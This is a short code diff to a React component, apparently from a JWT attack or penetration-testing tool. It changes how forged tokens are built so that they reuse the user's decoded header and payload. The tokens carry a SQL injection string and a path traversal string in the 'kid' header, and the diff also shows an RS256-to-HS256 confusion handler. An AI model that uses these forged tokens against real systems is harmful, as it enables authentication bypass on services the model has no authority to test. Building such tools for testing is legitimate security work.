@@ -50,14 +50,16 @@ export function JwtForgeBuilder() {
   }, [decoded])
 
   const kidSqliJwt = useMemo(() => {
-    const header = { alg: 'RS256', typ: 'JWT', kid: "' UNION SELECT 'attacker-secret'-- -" }
-    return `${encodeJson(header)}.${encodeJson({ sub: '123' })}.SIGNATURE`
-  }, [])
+    const header = { ...(decoded.header ?? { alg: 'RS256', typ: 'JWT' }), kid: "' UNION SELECT 'attacker-secret'-- -" }
+    const payload = decoded.payload ?? { sub: '123' }
+    return `${encodeJson(header)}.${encodeJson(payload)}.SIGNATURE`
+  }, [decoded])
 
   const kidPathTraversalJwt = useMemo(() => {
-    const header = { alg: 'RS256', typ: 'JWT', kid: '../../../../dev/null' }
-    return `${encodeJson(header)}.${encodeJson({ sub: '123' })}.SIGNATURE`
-  }, [])
+    const header = { ...(decoded.header ?? { alg: 'RS256', typ: 'JWT' }), kid: '../../../../dev/null' }
+    const payload = decoded.payload ?? { sub: '123' }
+    return `${encodeJson(header)}.${encodeJson(payload)}.SIGNATURE`
+  }, [decoded])
 
   const handleRS256toHS256 = async () => {
     if (!decoded.header || !decoded.payload) { setSignError('먼저 유효한 JWT를 입력하세요.'); return }
